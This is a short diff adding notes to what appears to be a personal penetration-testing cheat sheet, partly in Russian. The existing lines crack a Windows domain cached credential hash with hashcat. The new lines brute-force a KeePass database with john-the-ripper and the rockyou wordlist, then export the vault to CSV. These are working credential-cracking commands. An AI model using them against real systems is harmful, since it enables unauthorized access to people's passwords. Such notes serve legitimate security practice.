@@ -35,3 +35,20 @@ echo ; cat mscache.txt ; echo ; cut -d ":" -f 2 mscache.txt
 вывод: $DCC2$10240#fsp_bkp#c05bf437de8b9c25930a1e2ec7818a2f
 ┌──(kali㉿kali)-
 └─$ hashcat -m 2100 '$DCC2$10240#fsp_bkp#c05bf437de8b9c25930a1e2ec7818a2f' /usr/share/wordlists/rockyou.txt --force --potfile-disable
+
+
+
+
+
+#keepass брут Database.kdbx
+keepass2john recovery.kdbx 
+! recovery.kdbx : File version '40000' is currently not supported! # сейчас не работает
+
+sudo snap install john-the-ripper
+john-the-ripper.keepass2john Database.kdbx | tee recovery.kdbx.hash
+john-the-ripper recovery.kdbx.hash --wordlist=rockyou.txt
+
+keepassxc.cli export --format csv Database.kdbx
+
+
+
